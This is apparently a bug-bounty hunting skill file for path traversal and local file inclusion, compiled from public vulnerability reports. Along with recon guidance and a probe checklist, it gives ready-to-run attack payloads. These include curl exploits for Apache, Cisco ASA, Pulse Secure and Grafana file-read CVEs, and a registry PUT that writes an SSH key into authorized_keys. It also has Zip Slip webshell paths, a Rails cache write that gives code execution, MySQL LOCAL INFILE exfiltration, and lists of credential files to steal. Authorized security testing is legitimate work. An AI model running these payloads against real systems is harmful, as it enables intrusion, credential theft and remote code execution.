---
name: hunt-path-traversal
description: "Hunting skill for the PATH TRAVERSAL / directory traversal / Local File Inclusion (LFI) class, built from 303 assigned reports of which 256 full disclosed report texts were read in full. Covers arbitrary file read (/etc/passwd, config/secrets), arbitrary file write/delete (authorized_keys, cron, webshell), Zip Slip / tar-symlink archive escapes, package-registry and dependency tarball traversal, proxy/rewrite path confusion, Apache CVE-2021-41773/42013, Cisco ASA/FTD CVE-2020-3452 & CVE-2018-0296, Grafana /public/plugins/ LFI, curl file:// and wildcard traversal, Windows device names and UNC backslash escapes, Jolokia `!`-separated LFI, MySQL LOAD DATA LOCAL INFILE exfiltration, and client-side/CSS relative-path-overwrite. Includes a strict Gate 0 false-positive discipline: echoed paths and lone status-code changes are not proof — show real file contents. Use when hunting any file-read, file-write, download, import, archive-extraction, static-file-serving, or path-injection surface."
sources: hackerone_public, internet_bug_bounty, portswigger_research, public_code_search, github_security_lab
report_count: 303
full_reports_read: 256
---

## Crown Jewel Targets

Path traversal pays out when the primitive crosses from "read a file" into **secret disclosure or code execution**. A bare `/etc/passwd` read is Medium; a write into an execution path, a leaked private key, or a cloud credential is Critical. From the 256 full reports, the highest-value targets cluster into these buckets:

- **Arbitrary file WRITE into an execution or trust path** — the most reliable Critical. A write to `~/.ssh/authorized_keys`, a cron directory, a webroot `.php`, or an app startup file converts a traversal into RCE. GitLab #733072 wrote an SSH public key through the Maven package registry API (`%2e%2e%2f...%2f.ssh%2fauthorized_keys`) and logged in as `git`; #519220 wrote a cached page containing ERB into Rails and got RCE; #1102067 dropped a PNG-with-PHP payload via a Concrete CMS design dialog. The write target matters more than the traversal itself — aim for a path the server will execute or trust.
- **Package registries and dependency tooling** — a rich, frequently-missed write surface. Maven, NuGet, npm/bower/Yarn, RubyGems, and CI cache systems all accept archive or metadata entries whose names/versions become filesystem paths. GitLab #822262 used a `<version>../../../../../nyangawa</version>` Nuspec field; #473811 (bower) and #362119 (unzipper/adm-zip) are symlink/Zip-Slip writes; #730239 tested whether Yarn unpacks symlinks from a gzipped tarball; #301432 poisoned the shared GitLab CI runner cache (`runners-cache-4-internal.gitlab.com`). Anything that unpacks a package is an extraction sink.
- **Public static-file and plugin-serving routes** — unauthenticated arbitrary read. Grafana `/public/plugins/mysql/..%2F...` (#1415820, #1419213, #1427086) and Apache Alias `/cgi-bin/%%32%65...` (#1394916, #1400238, #1404731) are canonical. `--path-as-is` is essential because curl/browsers normalize `../` before sending. Any route that maps URL segments directly to disk (static plugins, `/_next/data/`, `serve` module #307666) deserves a depth ladder.
- **Network appliances / VPN / firewall web UIs** — pre-auth file read at scale. Pulse Secure CVE-2019-11510 (#696276) and the Cisco ASA/FTD family CVE-2020-3452 / CVE-2018-0296 / CVE-2020-3187 (#936399, #695429, #959187, #2233418, #960330, #1455257, #1555015) dominate the DoD reports. These web filesystems (`/+CSCOT+/`, `/+CSCOE+/`, `/+CSCOU+/`, `/dana-na/...`) are reachable unauthenticated and yield `/etc/passwd`, session files, and source code.
- **Download / export / attachment endpoints** — `?file=`, `?path=`, `?filePathDownload=` where the app prepends a base directory. #1639364 required a *valid externally-facing directory* before the `../` chain — probe both with and without a known-good prefix. #895972 showed an LFI limited by an appended `.md` suffix; such "partial" reads still disclose app-root files and may be bypassable with encoding or null bytes on legacy stacks.
- **Archive-extraction and image-upload features** — Zip Slip, tar symlink escape, avatar extension traversal (#765291, #205481, #316713, #671605, #317321). The filename, the ZIP entry name, or the extension is the sink — there may be no `?file=` parameter at all. UniFi config restore (#329770) and UniFi Video Server upload (#129641) show the same class in authenticated admin surfaces.
- **Proxy / rewrite / aggregation layers** — path confusion where a front-end and origin disagree on segments. Shopify app proxy (#869888), Trellix ESM `ProxyPass` with `..;/` (#2817658), and Acronis client-side CSS relative-path overwrite (#1245165). Matrix params and doubled separators are the signature here.
- **Protocol/parser-specific read sinks** — Jolokia `!/etc!/passwd` (#2778380), `LOAD DATA LOCAL INFILE '/etc/passwd'` (#719875), `file://../` template macros (CVE-2019-3396, #538771), curl `file:///%2f%2e%2e%2f...` (#3465094), FTP wildcard `%2e%2e%2f` (#3973143), and Node.js permission-model / Buffer internals (#2434811, #2225660).
- **Source-code and config disclosure as a pivot** — once a read works, app source (`index.php`, `web.xml`, `application.properties`) reveals hardcoded secrets and new sinks. The Markdown-plugin LFR in Atlassian Jira (#518641) and Concrete5 dispatch LFI (#59665) show how a "small" read cascades.

Highest-severity chains in this corpus: traversal → **SSH key / cron write → RCE** (GitLab, Concrete CMS); traversal → **source/config read → hardcoded secrets / new sinks**; traversal → **archive symlink escape → delete or overwrite outside the sandbox**; traversal → **cloud metadata / internal file read**; client-side path traversal → **CSS injection → PII exfiltration** (#1245165). Severity is a function of what you can reach, not the `../` itself.

---

## Attack Surface Signals

### URL / Path Patterns to Hunt
```
?file=        ?path=        ?filePath=      ?filePathDownload=
?download=    ?read=        ?content=       ?page=
?template=    ?view=        ?include=       ?doc=
?img=         ?image=       ?avatar=        ?pdf=
?report=      ?export=      ?load=          ?resource=
?lang=        ?theme=       ?static=        ?asset=
?url=         ?src=         ?source=        ?dir=
?filename=    ?name=        ?key=           ?id=        (can become a path)
/public/plugins/*/../../..            (Grafana-style static plugin routes)
/+CSCOT+/ /+CSCOE+/ /+CSCOU+/         (Cisco ASA/FTD web filesystem)
/cgi-bin/ ... /etc/passwd             (Apache Alias + CGI)
/_next/data/<token>/...               (Next.js static data routes)
/jolokia/exec/.../compilerDirectivesAdd/...   (JMX HTTP bridge)
/dana-na/../dana/html5acc/guacamole/   (Pulse Secure pre-auth read)
/static/..%252f..%252fetc/passwd      (double-encoded static route)
```

Any endpoint whose response is a file, a rendered template, a cached page, or a download is a candidate. A parameter whose value looks like a filename, a relative path, a locale, a theme, or a document name is a candidate even if it is not called "file".

### Body / Header / Metadata Sinks
```
JSON: {"file":...} {"path":...} {"filename":...} {"_template":"file://../"}
      {"key":...} {"version":"../../..."} {"run_id":"../../..."}
XML:  <version>../../../../x</version>   (NuGet Nuspec)
ZIP/TAR entry names: ../../etc/cron.d/x ; symlink -> /etc/passwd
HTTP: Content-Disposition filename (curl -O -J), extension fields,
      X-Original-URL / X-Rewrite-URL (proxy path confusion)
```
The study pack repeatedly shows sinks outside the query string: a JSON `_template` field (#538771), a Nuspec `<version>` element (#822262), a ZIP member name (#765291), a tar symlink (#317321), a `run_id` parameter (#2070212), and a `Content-Disposition` filename (#3408126). Do not stop at URL parameters.

### Technology / Stack Signals
| Signal | Likely traversal vector |
|--------|-------------------------|
| `Server: Apache/2.4.49` or `2.4.50` | CVE-2021-41773 / CVE-2021-42013 — `%%32%65`, RCE if CGI enabled |
| Grafana (any hosted instance) | `/public/plugins/<plugin>/..%2F...` unauthenticated read |
| Cisco ASA / FTD WebVPN / AnyConnect | CVE-2020-3452, CVE-2018-0296, CVE-2020-3187 |
| Pulse Secure SSL VPN | CVE-2019-11510 pre-auth arbitrary read |
| GitLab / package registries | Maven/NuGet/npm path traversal → authorized_keys write |
| Node.js `path.join` / `path.normalize` / permission model | Buffer monkey-patch, UNC device names, `..;/` |
| Windows host / UNC paths | `..\..\`, device names CON/PRN/AUX, backslash traversal |
| cURL / libcurl consumers | `file://` dedotdotify bypass, FTP wildcard, Content-Disposition |
| Java/JMX over HTTP (Jolokia) | `!`-separated path segments → local file read |
| MySQL client with `LOAD DATA LOCAL` | exfiltrate server files to attacker MySQL |
| Zip/Tar extraction, `unzip_file`, backup restore | Zip Slip, tar symlink escape |
| Ruby on Rails / ActiveStorage / page caching | `key` traversal, `run_id` traversal, cache write → RCE |
| WordPress / Concrete5 / Drupal-style CMS | upload-dir traversal, `unlink` via metadata, dispatch LFI |
| `serve` / static-file modules | arbitrary directory listing + file read (#307666) |

### Sensitive Files to Target (escalation list for a confirmed read)

Pick a file whose bytes you can fingerprint. The study pack's reports read `/etc/passwd` most often, but the real payouts came from config, keys, and source.

```
# Linux — proof-of-read
/etc/passwd                 /etc/hosts               /etc/hostname
/etc/crontab                /etc/shadow (rarely readable)
# Linux — secrets & source
/proc/self/environ          /proc/self/cmdline       /proc/self/fd/0
/var/www/html/.env          /var/www/html/config.php  /var/www/html/wp-config.php
/var/www/html/app/config/parameters.yml   (Symfony)
/home/*/.ssh/id_rsa         /root/.ssh/id_rsa        /root/.bash_history
~/.aws/credentials          ~/.docker/config.json    /run/secrets/*
.git/config                 .git/HEAD                composer.json
# Java / app servers
WEB-INF/web.xml             WEB-INF/classes/application.properties
/usr/share/tomcat8/conf/tomcat-users.xml
# Windows
C:\Windows\win.ini          C:\inetpub\wwwroot\web.config
C:\Windows\System32\inetsrv\config\applicationHost.config
# Write targets for RCE chain
~/.ssh/authorized_keys      /etc/cron.d/<name>        /var/www/html/shell.php
```

### Tool / Traffic Signals
- **Responses that change `Content-Type` to `text/plain` / `application/octet-stream`** when `../` is added — a strong tell that raw file bytes are being returned (#333306, #229622).
- **A `Last-Modified` header on a dynamic-looking route** — you are reading a real static file, not a rendered page.
- **Error messages that disclose the full extraction/destination path** — use them to calibrate how many `../` are needed (#316713).
- **Clients that normalize the path before send** — always retest with `--path-as-is` / Burp Repeater, or the traversal is stripped client-side (#696276, #695429). Firefox/IE failed to reproduce some raw HTTP traversals (#333306) — do not let the browser be your only test client.
- **Long, repetitive URL-encoded segments** (`%2F` repeated, `%%32%65`) — likely a known CVE pattern worth matching exactly.

---

## Discovery Patterns From 256 Full Reports

### Where Researchers Start (ranked recon surfaces from study pack frequency table with "what to look for")

The study pack's frequency table counts, per surface, how many of the 256 full reports contained that signal. The ranking is how researchers actually found the bug — start at the top and work down.

1. **path-traversal-lfi (213/256)** — the dominant surface, present in most findings. What to look for: any parameter, path segment, or filename that becomes a filesystem path; test `../` chains first and confirm with real file contents rather than status codes.
2. **search-filter-sort (105/256)** — search/filter/sort parameters on listing endpoints often feed a template or resource path. What to look for: sort-by, view, and filter values; inject `../` and watch for error-path disclosure.
3. **js-source-review (85/256)** — mine JS bundles for route/URL construction, `color_scheme`-style parameters concatenated into asset paths (#1245165), and hidden API endpoints referenced by the frontend. What to look for: GET params concatenated into `.css`/`.js` URLs, and any string built with `+` that ends in a file extension.
4. **internal-network (81/256)** — appliances and internal admin endpoints (Jolokia, Nexus, CI caches) reachable through a proxy or `..;/` path confusion. What to look for: management bridges, `ProxyPass` configs, `runners-cache-*-internal` hosts, and default-credential admin panels (#435457).
5. **dependency-confusion (73/256)** — malicious packages, tarballs, and registries where metadata fields (name/version) or symlinks become paths. What to look for: extraction code in package managers; version/name fields that are concatenated into filenames (#822262, #473811).
6. **image-processing (72/256)** — avatar/thumbnail converters, avatar filename extensions (#671605), SMIL/SVG resource loading (#3590576), image transformers with write operations (#3553340). What to look for: filename/extension parameters and transformation options like `write_to_file`.
7. **public-code-search (51/256)** — GitHub/GitLab code search for `file_get_contents`, `path.join`, `sendFile`, `unzip`, or for patches to recent CVEs you can test for incompleteness (#1353603, #3328367). What to look for: recent security-fix commits and the exact files they changed.
8. **comment-injection (50/256)** — archive extraction utilities and backup tools (`mbstream`, #3678395) where chunk paths are not validated. What to look for: `..` path components in archive member names.
9. **filter-bypass (48/256)** — a filter exists; find the decode/normalization gap (double-encode, `..;/`, `%%32%65`, overlong UTF-8). What to look for: the order of validation vs. decode.
10. **api-endpoint (45/256)** — REST/package APIs that accept a path-like field, especially PUT/write endpoints. What to look for: `file`, `path`, `key`, `version`, `filename` fields in JSON/XML bodies.
11. **server-side-rendering (41/256)** — template macros (`_template: file://../`, #538771) and page caches (#519220) that resolve files. What to look for: preview/render endpoints and cache-key parameters.
12. **admin-internal (37/256)** — authenticated admin/restore/config-import features that extract zips to arbitrary locations (#329770, #129641). What to look for: "restore", "import", "upload theme", "install plugin" functions.
13. **cache-layer (32/256)** and **session-attack (32/256)** — shared caches and session/file handles used as path primitives. What to look for: cache download URLs with project IDs and session-derived filenames.
14. **xml-parser (29/256)** — Nuspec/XPATH metadata, SVG/SMIL, XXE-adjacent file resolution. What to look for: XML elements whose text is used as a path.
15. **file-upload (24/256)** and **proxy-feature (24/256)** — direct upload filename traversal and reverse-proxy path normalization mismatches. What to look for: `..\..\` on Windows and `/apps/x/b.php/../../`-style upstream escapes.
16. **unicode-normalization (19/256)** / **double-encoding (7/256)** — the bypass layer on top of all of the above. What to look for: encoded dots/slashes and mixed-width characters.

### Full Signal Frequency Table (all 256 full reports, verbatim counts)

Reproduced from the study pack's section 1. Use it to weight recon effort — the top five surfaces account for the overwhelming majority of findings. Counts are "full reports containing signal," so a single report can appear in several rows.

```
path-traversal-lfi ............ 213     search-filter-sort ........... 105
js-source-review .............. 85      internal-network ............. 81
dependency-confusion .......... 73      image-processing ............. 72
public-code-search ............ 51      comment-injection ............ 50
filter-bypass ................. 48      api-endpoint ................. 45
server-side-rendering ......... 41      admin-internal ............... 37
cache-layer ................... 32      session-attack ............... 32
xml-parser .................... 29      file-upload .................. 24
proxy-feature ................. 24      cookie-handling .............. 23
stored ........................ 20      unicode-normalization ........ 19
dos-resource .................. 19      url-fetching ................. 18
redirect-handling ............. 16      cloud-metadata ............... 15
template-engine ............... 14      import-feature ............... 11
debug-error-leak .............. 10      misconfiguration ............. 10
sso-oauth ..................... 9       double-encoding .............. 7
brute-otp-reset ............... 6       subdomain .................... 6
template-injection ............ 6       request-smuggling ............ 6
link-preview .................. 5       json-body .................... 5
command-injection ............. 5       blind-oob .................... 5
nosql-mass-assignment ......... 5       error-based .................. 4
csrf .......................... 4       open-redirect ................ 4
stack-fingerprinting .......... 4       subdomain-takeover ........... 4
deserialization ............... 3       base64-encoding .............. 3
export-feature ................ 3       race-condition ............... 2
dom-based ..................... 2       recon ........................ 2
auth-bypass ................... 2       idor-object-ref .............. 2
reflected ..................... 1       webhook ...................... 1
csv-parser .................... 1       mutation-polyglot ............ 1
xxe ........................... 1       websocket .................... 1
host-header ................... 1       port-scanning ................ 1
svg-upload .................... 1
```

How to read it: `path-traversal-lfi` (213) is the primitive itself; `search-filter-sort` (105) and `js-source-review` (85) are the two biggest *discovery* channels — they tell you where to find the sink. `dependency-confusion` (73) and `image-processing` (72) point to non-HTTP, archive/converter surfaces that pure web fuzzing misses. `filter-bypass` (48), `unicode-normalization` (19), and `double-encoding` (7) are the bypass layer. `cloud-metadata` (15) and `blind-oob` (5) are impact/confirmation channels rather than entry points.

### Feature-Based Discovery Signals (frequency-ranked table with "why it matters / what to probe")

| Rank / signal (count) | Why it matters | What to probe |
|-----------------------|----------------|---------------|
| path-traversal-lfi (213) | Core primitive; present in most findings | `../` depth escalation, `--path-as-is`, absolute paths, prefix-forced bases |
| search-filter-sort (105) | Query values reach path/resource builders | Inject `../` in sort/view/filter; watch for error-path disclosure |
| js-source-review (85) | Frontend concatenates user input into asset URLs | grep bundles for GET params concatenated into `.css`/`.js` paths |
| internal-network (81) | Management bridges expose file ops | `..;/` through ProxyPass; JMX `!/`-separated paths |
| dependency-confusion (73) | Tarball entries/symlinks escape extraction dir | Craft malicious package with `../` names and symlinks |
| image-processing (72) | Converters read local files & write arbitrary paths | filename extensions, SMIL `values`/`by`, transformer write ops |
| public-code-search (51) | Public repos reveal incomplete fixes | search CVE IDs + "patch"/"fix"; diff current source |
| comment-injection (50) | Backup/archive utilities skip `..` checks | archive chunk path `../`; `MY_RELATIVE_PATH` only blocks absolute |
| filter-bypass (48) | A filter implies an exploitable gap | double-encode, mixed separators, URL-encode slashes |
| api-endpoint (45) | APIs accept path-like fields directly | PUT with `%2e%2e%2f` and `--path-as-is` |
| server-side-rendering (41) | Templates resolve files | `_template:"file://../"`, cache key traversal |
| admin-internal (37) | Authenticated restore/config import | zip with `../` entry to arbitrary location |
| cache-layer / session-attack (32/32) | Paths cross trust boundaries | shared cache keys, session-derived file paths |
| xml-parser (29) | XML metadata becomes a path | `<version>../../</version>`, SVG/SMIL file refs |
| file-upload / proxy-feature (24/24) | Filenames and normalized paths | `..\..\` on Windows; `/apps/x/b.php/../../` proxy escape |
| cookie-handling / stored (23/20) | Paths persisted in cookies/DB then reused | stored filename → later read/unlink |
| unicode-normalization (19) / dos-resource (19) | Encoded chars evade literal checks; big files DoS | `%2e`, `%%32%65`, overlong UTF-8, `..;/` |
| url-fetching / redirect-handling (18/16) | Fetchers resolve local schemes | `file://`, redirect into `file://` |
| cloud-metadata (15) | Traversal can reach secrets | `~/.aws/credentials`, `/.docker/config.json` via read |
| template-engine / import-feature (14/11) | Template/import fields resolve paths | LFR in Markdown plugins, import zip paths |
| debug-error-leak / double-encoding (10/7) | Errors calibrate depth; encoding defeats filters | read full path from error, then stack encodings |
| sso-oauth / race-condition (9/2) | Rare wrappers around a path sink | incomplete patches, TOCTOU between check and write |

### Verbatim Discovery Clues (18 real `[#id]` quotes from study pack)

These are verbatim "how I found it" lines. They show the researcher's *entry point*, not just the final payload. Note the recurring themes: static-file serving, code review of patches, archive/symlink behavior, and raw HTTP clients that skip normalization.

1. `[#1415820]` "I've found a path traversal issue in the Grafana instances hosted on the Aiven platforms."
2. `[#519220]` "I found a directory traversal in `actionpack-page_caching`."
3. `[#719875]` "I've found a way to read Infogram's server local files through the MySQL connection."
4. `[#3255707]` "But then I started testing UNC paths (you know, network paths like `\\server\share`) and found the vulnerability still exists there."
5. `[#1245165]` "While looking at the HTTP requests to see if I could find any open redirect and demonstrate the impact I notice one interesting API endpoint"
6. `[#333306]` "I was able to view the internal server files at https://msg."
7. `[#869888]` "I found app proxy is vulnerable to path traversal, the attacker scenario is from anonymous user to oauth app owner."
8. `[#1377748]` "When renaming i founded that special characters are not restricted,for example file uploaded with name `libjnigraphics."
9. `[#229622]` "From within the http request function of the Acunetix and IronWasp programs I was able to view the passwd and hosts files at https://nightly."
10. `[#316713]` "The full file path of the zip file destination was identified from error messages observed during testing, e."
11. `[#695429]` "I discovered previously unidentified instance https://█████████ (████."
12. `[#3485930]` "During my manual review of the file path handling logic in curl's source code, I noticed the absence of proper validation for directory traversal sequences, which I then verified through practical testing."
13. `[#1102067]` "This bug was found as a part of Solar Security CMS Reseach, with https://hackerone."
14. `[#1353603]` "I was combing through your GitHub repository to look at the fixes for recent security releases and found [the fix for CVE-2021-22151](https://github."
15. `[#497771]` "I discovered a Path Traversal issue on the https://██████████/"
16. `[#820224]` "I started to dig deeper on how static files were served, and I've noticed that the module allowed a trivial path traversal in its code."
17. `[#660565]` "Of course, it would take ages to check all the ports one-by-one, but I found out some tricks that allow to do it in a few minutes."
18. `[#730239]` "Given that the package takes the form of a gzipped tarball, I decided to test if symlinks are unpacked as part of the Yarn install process."

### Probe Checklist (15 concrete probes)

Run these in order against each candidate. Every probe must end in a **content check** (does real file content appear?), not just a status-code diff.

1. `- [ ]` **Baseline.** Request the endpoint with a normal value; record status, length, `Content-Type`, and `Last-Modified` for comparison.
2. `- [ ]` **Depth ladder.** `../../../../etc/passwd`, then 6, 8, 12, 20 `../` segments — find the depth that escapes the base.
3. `- [ ]` **Raw path / `--path-as-is`.** Resend any URL-path traversal without client normalization (`curl --path-as-is`, Burp Repeater).
4. `- [ ]` **Prefix-forced base.** If the app prepends a directory, first supply a known-good external path then append `../` (#1639364).
5. `- [ ]` **Single-encode slashes.** `..%2f..%2f..%2fetc%2fpasswd`.
6. `- [ ]` **Double-encode.** `..%252f..%252fetc%252fpasswd` (#232371, #333306).
7. `- [ ]` **Encoded dots / overlong UTF-8.** `%2e%2e%2f` and `%c0%ae%c0%ae%2f`.
8. `- [ ]` **Stripping bypass.** `....//....//etc/passwd` and `..././..././` for single-pass `../` removal.
9. `- [ ]` **Absolute path.** `/etc/passwd` directly (works when no base is prepended).
10. `- [ ]` **Windows / UNC.** `..\..\..\windows\win.ini` and `..%5c..%5c`; device names + UNC for Node.js (#3255707).
11. `- [ ]` **Apache CVE probe.** `/cgi-bin/%%32%65%%32%65/.../etc/passwd`, then POST to `/bin/sh` only if authorized (#1404731).
12. `- [ ]` **Cisco probe.** `/+CSCOT+/translation-table?...&lang=../` and `/+CSCOU+/../+CSCOE+/files/file_list.json` with `--path-as-is`.
13. `- [ ]` **Archive probe.** Build a ZIP/tar with `../../../<canary>` entry and a symlink to `/etc/passwd`; confirm a file lands outside the extraction dir (#765291, #730239).
14. `- [ ]` **Protocol probe.** `file://../`, `file:///%2f%2e%2e%2f...`, `netdoc:`, `LOAD DATA LOCAL INFILE`, Jolokia `!/etc!/passwd` where the sink type allows.
15. `- [ ]` **Content confirmation.** grep response for `root:x:0:0:`, decode any base64 filter output, and request a non-existent sibling to rule out reflection.

---

## Step-by-Step Hunting Methodology

### Phase 1 — Map path-bearing inputs
1. Spider the target and collect every URL, JS bundle, and API spec. Route traffic through a MITM proxy so exact request/response pairs are retained.
2. Mine JS for GET parameters concatenated into asset paths (`color_scheme` → `.css` in #1245165) and for hidden endpoints (the Acronis researcher found the pivot while hunting open redirects).
3. Search public code (GitHub/GitLab) for the target's frameworks and for recent CVE patches you can test for incompleteness (#1353603, #3328367, #3255707).
4. Build a candidate list: download/export endpoints, static/plugin routes, proxy/rewrite routes, archive imports, avatar uploads, package APIs, and any parameter named like a path or filename.
5. Fingerprint the stack (Apache version, Grafana, Cisco/Pulse appliances, Node.js, Ruby, CMS) and select the matching named-CVE probes from the Payload section.

### Phase 2 — Establish the read primitive
6. For each candidate, run Probe Checklist items 1–10. Use depth ladders and `--path-as-is`.
7. Target a file whose content you can fingerprint exactly: `^root:x:0:0:`. On Windows use `C:\Windows\win.ini` (#1131465, #260420).
8. When a read works, escalate target selection: app source (`index.php`, `web.xml`, `application.properties`), config/secrets (`.env`, `wp-config.php`), cloud creds (`~/.aws/credentials`), SSH keys, cron, and `/proc/self/environ`.
9. If the app prepends a base dir, calibrate with a known-good prefix and pad `../` (#1639364); if it appends an extension (`.md` in #895972), test truncation or encoding.
10. Calibrate traversal depth from verbose error messages that leak the extraction/destination path (#316713), then reduce the payload to the minimum that works.

### Phase 3 — Turn reads into writes (the Critical path)
11. If the sink is a write (PUT/upload/extract/import), aim for an execution or trust location: `~/.ssh/authorized_keys` (#733072), a webroot PHP file, a cron entry, or an app cache rendered as a template (#519220).
12. For archives: craft a member named `../../../<dest>` and a symlink variant; confirm the create/delete/overwrite with a unique canary outside the extraction dir (#765291, #205481, #316713, #317321, #730239).
13. For package registries: put traversal in the name/version metadata field that the service concatenates into a filename (#822262, #473811, #362119).
14. For proxies: inject `..;/`, doubled `../`, or encoded segments so the edge routes benignly but the origin resolves the escape (#869888, #2817658).
15. For Rails/Airflow-style params: try `key` (#2334455) and `run_id` (#2070212) traversal.

### Phase 4 — Parser / protocol-specific sinks
16. If a template macro or import accepts a URI, try `_template:"file://../"` (CVE-2019-3396, #538771), `netdoc:`, or `php://filter/convert.base64-encode/resource=`.
17. If there is a database connection feature, test `LOAD DATA LOCAL INFILE '/etc/passwd'` pointed at your own MySQL listener (#719875).
18. If a JMX/Jolokia HTTP bridge exists, use `!/`-separated segments: `/compilerDirectivesAdd/!/etc!/passwd` (#2778380).
19. If a cURL/libcurl consumer exists, test `file:///%2f%2e%2e%2f...` (#3465094), FTP wildcard `%2e%2e%2f` filenames (#3973143), and `Content-Disposition` `-O -J` writes (#3408126).
20. If Node.js permission-model code is in scope, test Buffer monkey-patching (#2434811) and incomplete `path.resolve` protections (#2225660).

### Phase 5 — Client-side / browser-mediated traversal
21. If a frontend concatenates a parameter into an asset path, use relative-path overwrite: `?color_scheme=%2F..%2F..%2FPARAMETER` → `/PARAMETER.css`, then assess CSS-injection impact (#1245165).
22. Note that browser-side traversal may require a specific client; a raw HTTP tool may not reproduce it (#333306). Confirm in a browser when the sink is client-side.

### Common mistakes (learned from the corpus)
- **Testing only through a browser** — clients normalize `../`, hiding the bug. Several reports could only be reproduced with `curl --path-as-is` or a raw HTTP tool (#696276, #695429, #333306).
- **Stopping at one `../` depth** — prefix-forced bases need padding, and some endpoints only work when a valid path precedes the traversal (#1639364).
- **Ignoring non-URL sinks** — the highest-value writes came from a Nuspec `<version>`, a ZIP member name, a `key`, a `run_id`, and a Content-Disposition filename (#822262, #765291, #2334455, #2070212, #3408126).
- **Assuming a patched CVE is closed** — UNC paths, `.svn`/`.bzr`, the Vips transformer, and Buffer-based paths were all missed by first fixes (#3255707, #4037976, #3553340, #2434811).
- **Reporting a partial read as RCE** — #895972 explicitly self-rated low because the appended `.md` could not be truncated; be equally honest.
- **Forgetting the negative control** — without a non-existent-sibling request you cannot distinguish a real read from reflection or a canned error page.

### Phase 6 — Confirm, attribute, document
23. Replay every candidate with a clean session and a negative control (non-existent sibling file).
24. Capture the exact raw request/response, the file content, and (for writes) proof the canary landed outside the intended directory.
25. Only then assign severity per Gate 0 and write the report, citing the exact endpoint and payload used.

---

## Payload & Detection Patterns

### Core read payloads
```bash
# Unix path traversal depth ladder
../../../../etc/passwd
../../../../../../../../etc/passwd
/etc/passwd                              # absolute, when no base is prepended

# Prefix-forced base (app prepends a known directory)
data_products/MISC/frida_cal/../../../../../../../../etc/passwd   # valid prefix first (#1639364)

# URL-encoded variants
..%2f..%2f..%2fetc%2fpasswd
..%252f..%252f..%252fetc%252fpasswd      # double-encode (#232371, #333306)
%2e%2e%2f%2e%2e%2fetc%2fpasswd
%c0%ae%c0%ae%2f%c0%ae%c0%ae%2fetc%2fpasswd   # overlong UTF-8 (legacy)

# Single-pass stripping bypass
....//....//....//etc/passwd
..././..././..././etc/passwd
```

### Windows / UNC / device-name payloads
```bash
..\..\..\..\..\windows\win.ini
..%5c..%5c..%5cwindows%5cwin.ini
C:\inetpub\wwwroot\web.config
# Node.js path.join with UNC + device name (CVE-2025-27210 incomplete fix, #3255707):
#   path.join('\\\\server\\share\\uploads', 'CON:../../secret.txt')
#   path.normalize('CON:../../secret.txt') is fixed for regular paths, not UNC
```

### Named-CVE / appliance payloads
```bash
# Apache 2.4.49/2.4.50 (CVE-2021-41773 / 42013)
curl --path-as-is 'http://HOST/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd'
# alternate bypass forms (#1404731): .%%32%65 / .%%32e / .%2%65
# RCE (authorized testing only): POST same path prefix to /bin/sh with body `id`

# Cisco ASA / FTD CVE-2020-3452
curl --path-as-is 'https://HOST/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../'
# CVE-2018-0296 session disclosure
curl -i -k --path-as-is 'https://HOST/+CSCOU+/../+CSCOE+/files/file_list.json?path=/sessions'
# CVE-2020-3187 arbitrary file deletion target: /+CSCOE+/session_password.html

# Pulse Secure CVE-2019-11510
curl -i -k --path-as-is 'https://HOST/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/'

# Grafana unauthenticated read (#1415820, #1427086)
curl 'https://HOST/public/plugins/mysql/..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd'
```

### Write / archive / registry payloads
```bash
# SSH key write via package registry (GitLab #733072)
curl -H "Private-Token: $TOKEN" \
  'http://HOST/api/v4/projects/2/packages/maven/a%2fb%2fc%2fd%2fe%2ff%2fg%2fh%2fi%2f1/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f.ssh%2fauthorized_keys' \
  -XPUT --path-as-is --data-binary @~/.ssh/id_rsa.pub

# Nuspec version-field traversal (GitLab #822262)
<version>../../../../../nyangawa</version>

# Zip Slip entry name / tar symlink
../../../var/www/html/shell.php
ln -s /etc/passwd tmp_link   # then archive the symlink (#317321, #730239)

# Rails cache write → RCE (#519220)
curl "http://HOST/books/1%2f%2e%2e%2f%2e%2e%2f%2e%2e%2ftest"
# ERB payload <% `touch me` %> cached into a served page

# Windows Tempfile basename/ext (#1131465)
Tempfile.open(["\\..\\..\\..\\..\\..\\Users\\rootx\\malicious", ".rb"])
```

### Protocol / parser payloads
```bash
# Template macro LFI (CVE-2019-3396, #538771)
{"contentId":"12345","macro":{"name":"widget","body":"",
 "params":{"url":"https://example.com/","width":"300","height":"200","_template":"file://../"}}}

# MySQL local file exfil (#719875)
LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE asd.asd FIELDS TERMINATED BY "\n"

# Jolokia `!`-separated read (#2778380)
/jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/etc!/passwd
/jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/etc!/crontab

# cURL file:// encoded traversal (#3465094)
file:///%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
# dedotdotify() only matches literal '/', so %2f survives; Curl_urldecode() then decodes it

# cURL FTP wildcard traversal (#3973143)
# server LIST returns filename `%2e%2e%2fsecret.txt` -> decoded to ../secret.txt

# Client-side relative path overwrite (#1245165)
?color_scheme=%2F..%2F..%2FPARAMETER   ->   /PARAMETER.css
```

### Source-review grep patterns (when public code or a JS bundle is available)

```bash
# Find filesystem calls fed by variables
grep -rE "(file_get_contents|fopen|readfile|include|require|sendFile|send_from_directory|open)\s*\(" \
  --include="*.py" --include="*.js" --include="*.php" --include="*.rb" --include="*.go"

# Find path concatenation/join sinks
grep -rE "(path\.(join|normalize|resolve)|Path\.Combine|dirname|basename|filepath\.Join)" \
  --include="*.js" --include="*.go" --include="*.cs"

# Find archive extraction that may be Zip-Slip / symlink prone
grep -rE "(extract|unzip|untar|ZipFile|tarfile|ExtractTo|mkdir_p_safe|unpack)" \
  --include="*.py" --include="*.js" --include="*.rb" --include="*.php"

# Find request params used as paths
grep -rE "(file|path|filename|template|view|page|key|run_id|version)\s*=\s*req\.(query|params|body)"
grep -rE "\$_((GET|POST|REQUEST))\[['\"](file|path|page|template|thumb|bFilename)"

